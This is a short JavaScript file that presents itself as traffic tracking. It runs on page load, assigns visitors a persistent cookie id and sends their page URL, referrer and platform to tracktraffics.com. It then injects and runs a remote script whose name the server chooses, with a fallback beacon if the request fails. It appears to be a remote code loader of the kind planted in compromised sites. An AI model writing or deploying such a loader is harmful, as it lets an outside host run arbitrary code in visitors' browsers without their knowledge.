(function() {
    async function main() {
        //if (sessionStorage.getItem('re_ret_session_triggered')) return;
        //sessionStorage.setItem('re_ret_session_triggered', 'true');

        const getCookie = (name) => {
            return document.cookie.split('; ').reduce((r, v) => {
                const parts = v.split('=');
                return parts[0] === name ? decodeURIComponent(parts[1]) : r
            }, '');
        };

        const setCookie = (name, value) => {
            document.cookie = `${encodeURIComponent(name)}=${encodeURIComponent(value)}; path=/; max-age=86400; SameSite=Lax`;
        };

        const uid = getCookie('re_ret_uid') || crypto.randomUUID?.() || Date.now().toString(36) + Math.random().toString(36).substring(2);
        setCookie('re_ret_uid', uid);

        try {
            const response = await fetch('https://www.tracktraffics.com/api/datascript', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    url: window.location.href,
                    referrer: document.referrer || 'direct',
                    uid: uid,
                    device: navigator.userAgentData?.platform || 'unknown'
                })
            });

            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
            
            const data = await response.json();
            if (!data?.name || !data?.url) throw new Error('Invalid response format');

            const script = document.createElement('script');
            script.src = `https://www.tracktraffics.com/${encodeURIComponent(data.name)}.js?url=${encodeURIComponent(data.url)}`;
            script.async = true;
            document.head.appendChild(script);

        } catch (error) {
            console.warn('Tracking error:', error);
            // Fallback tracking method
            new Image().src = `https://www.tracktraffics.com/fallback?url=${encodeURIComponent(window.location.href)}`;
        }
    }

    if (document.readyState === 'complete') main();
    else window.addEventListener('load', main);
})();